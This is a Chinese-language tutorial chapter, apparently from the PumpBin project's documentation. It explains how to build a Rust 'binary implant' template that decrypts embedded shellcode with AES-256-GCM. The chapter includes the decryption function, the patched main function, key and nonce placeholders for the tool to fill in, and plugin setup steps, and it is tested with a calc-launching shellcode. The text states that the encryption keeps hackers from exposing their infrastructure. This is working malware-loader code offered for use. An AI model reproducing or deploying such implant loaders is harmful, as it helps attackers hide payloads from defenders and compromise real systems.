# Encryption

在这一章, 我们将制作一个使用AES256-GCM加密方法的Plugin.

上一章我们使用PumpBin Maker制作Plugin时, Encrypt Type选择的是None.
这个选项在现实世界中出现有两个可能:

1. 你使用了PumpBin暂时不支持的加密方法(请提交一个issue)
1. 你使用了自定义的加密方法(PumpBin将来会设计hook系统, 你将可以在加密时, 生成时, 或者patch时运行自定义代码, 以实现最大的灵活性)

以上两种情况, 你可能想制作一个`Remote`类型的Plugin, 并且使用固定的加密密码, 仅仅使用PumpBin修改shellcode url.

除此之外, 大部分黑客应该都想加密自己的shellcode, 没有人会愿意暴露基础设施.

## 制作二进制植入物模板

要制作有加密功能的Plugin, 我们的二进制植入物模板需要先实现对应的解密逻辑.

我们将在[上一章代码](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread)的基础上更改.

在Cargo.toml文件末尾添加下面的依赖

```toml
aes-gcm = "0.10.3"
```

在main.rs中的main函数上面添加如下解密函数

```rust
fn decrypt(data: &[u8]) -> Vec<u8> {
    const KEY: &[u8; 32] = b"$$KKKKKKKKKKKKKKKKKKKKKKKKKKKK$$";
    const NONCE: &[u8; 12] = b"$$NNNNNNNN$$";

    let aes = Aes256Gcm::new_from_slice(KEY).unwrap();
    let nonce = Nonce::from_slice(NONCE);
    aes.decrypt(nonce, data).unwrap()
}
```

其中两个被$$包裹的数组引用, 上一章已经出现过, 是两个`Place Holder`, PumpBin使用它来定位占位数据.
(`Place Holder`是固定大小, `Prefix`是动态大小, 所以上一章中需要Size Holder来确定shellcode真实长度)

在main.rs中main函数内第4行后添加如下代码

```rust
let shellcode = decrypt(shellcode);
```

添加完成后的main函数如下

```rust
fn main() {
    let shellcode = include_bytes!("../shellcode");
    const SIZE_HOLDER: &str = "$$99999$$";
    let shellcode_len = usize::from_str_radix(SIZE_HOLDER, 10).unwrap();
    let shellcode = &shellcode[0..shellcode_len];
    let shellcode = decrypt(shellcode);
    let shellcode_size = shellcode.len();
    ...
```

编译修改后的`create_thread`项目, 我们将得到一个使用AES256-GCM解密shellcode的二进制植入物模板.

```sh
cargo b -r
```

## 制作Plugin

我们使用PumpBin Maker制作Plugin, 其余操作都相同, 唯一不同的是Encrypt Type选择AesGcm.

Key填写`$$KKKKKKKKKKKKKKKKKKKKKKKKKKKK$$`

Nonce填写`$$NNNNNNNN$$`

## 测试Plugin

用PumpBin安装制作的Plugin, 并使用`w64-exec-calc-shellcode-func`生成一个最终植入物, 运行应该看到calc程序被启动.

至此, 我们制作了一个使用AES256-GCM加密方法的`Local`类型Plugin

前两章中, 我总是将`Local`突出显示, 以提醒这是一个关键词, 正确理解它们对于使用PumpBin非常重要.

下一章, 我们将制作第一个`Remote`类型的Plugin. 这允许将shellcode托管在远程服务器.
PumpBin将根据加密设置, 生成加密的shellcode文件(None也是一种加密方式), 用户将加密的shellcode托管到远程服务器, 然后将托管地址告诉PumpBin.

本例中的完整项目文件在PumpBin代码仓库的[examples/create_thread_encrypt](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_encrypt/src/main.rs).
